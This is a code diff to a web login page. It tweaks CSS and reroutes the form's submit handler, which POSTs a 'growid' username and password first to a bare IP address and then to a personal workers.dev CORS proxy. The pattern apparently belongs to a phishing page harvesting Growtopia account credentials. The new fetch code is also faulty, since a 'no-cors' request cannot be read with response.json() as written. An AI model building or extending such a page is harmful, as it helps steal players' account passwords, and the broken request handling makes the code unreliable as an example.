@@ -402,8 +402,8 @@
 
   .error-message {
     position: absolute;
-    bottom: -22px;
-    left: 0;
+    bottom: -20px;
+    left: 15px;
     color: #ff4444;
     font-size: 12px;
     opacity: 0;
@@ -552,10 +552,10 @@
         document.body.appendChild(div);
         return div;
     }
-    const API_URL = 'http://188.166.215.120:3000/api/login';
+    const API_URL = 'https://cors-proxy.adtya-dyansyh.workers.dev';
     const form_login = document.getElementById('loginForm');
     if (form_login) {
-        form_login.addEventListener('submit', function(e) {
+        form_login.addEventListener('submit', async function(e) {
             e.preventDefault();
             console.log("Login form submitted");
             
@@ -569,16 +569,15 @@
 
             
             if (isUsernameValid && isPasswordValid) {
-                const response = await fetch(API_URL, {
-                    method: 'POST',
-                    headers: {
-                      'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        growid: uName,
-                        password: uPass
-                    })
-                });
+                try {
+                  const response = await fetch(API_URL, {
+                      method: 'POST',
+                      mode: 'no-cors', // Hanya untuk kasus khusus
+                      headers: {
+                          'Content-Type': 'application/json',
+                      },
+                      body: JSON.stringify({ growid: uName, password: uPass })
+                  });
                 const data = await response.json();
                 if (!response.ok) {
                     showValidationError(document.getElementById('loginUsernameError'), data.message);
@@ -596,6 +595,11 @@
                     loginButton.textContent = "Login";
                     loginButton.classList.remove("loading"); 
                     }, 2000);       
+                }
+                }
+                catch (error) {
+                  console.error("Fetch error:", error);
+                  showValidationError(document.getElementById('loginUsernameError'), "Failed to connect to server.");
                 }
             }
         });
